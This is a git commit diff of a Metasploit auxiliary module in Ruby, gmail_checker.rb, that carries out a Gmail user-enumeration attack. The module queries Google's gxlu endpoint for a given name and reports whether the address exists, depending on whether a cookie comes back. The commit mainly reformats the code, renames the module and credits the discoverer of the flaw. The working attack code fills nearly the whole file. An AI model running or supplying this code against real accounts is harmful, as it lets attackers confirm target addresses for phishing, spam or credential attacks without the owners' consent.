81fd0d207181f53ea95e7abac9c7495b6072dc01
Mateus Lino <dctoralves@protonmail.ch>
2018-04-26 23:46:22 -0300

    Update gmail_checker.rb

--- gmail_checker.rb
+++ gmail_checker.rb
@@ -2,45 +2,39 @@
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
 require 'net/http'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
-
-  def initialize(info = {})
+ def initialize(info = {})
     super(update_info(info,
-      'Name' => 'Check e-mail valid by gmail',
+      'Name' => 'Enumeration users/gmails gmail',
       'Description' => %q{
-      This module check valid e-mail by gmail
-	},
-      'Author' => [ 'Mateus Lino <dctoralves@protonmail.ch>' ],
+       User enumeration attack on Gmail
+       },
+      'Author' =>
+      [
+       'x0rz', #Vulnerability Discovery
+       'Mateus Lino <dctoralves[at]gmail.com>'
+       ],
       'License' => MSF_LICENSE))
-
-    register_options(
+      register_options(
       [
         OptString.new('CHEK_GMAIL', [true, 'check emails valid by gmail']),
      ])
-
-
-  end
-
-  def check_gmail(targetdom)
-    print_status(". . . CHECKING . . . ")
-	clnt = URI("https://mail.google.com/mail/gxlu?email=#{targetdom}@gmail.com")
-	resp = Net::HTTP.get_response(clnt)
-	if (resp['Set-Cookie']) 	
-	print_status("E-mail valid")
-	else
-	print_status("E-mail invalid")
-	end
+end
+ def check_gmail(targetdom)
+    clnt = URI("https://mail.google.com/mail/gxlu?email=#{targetdom}@gmail.com")
+    resp = Net::HTTP.get_response(clnt)
+    if(resp['Set-Cookie'])
+    print_good("Valid email")
+    else
+    print_error("Invalid email")
+    end
  end
-  
-
   def run
     print_status("Checking email")
- 	target = datastore['CHEK_GMAIL']
+    target = datastore['CHEK_GMAIL']
     check_gmail(target) if datastore['CHEK_GMAIL']
-   
-  end
+   end
 end
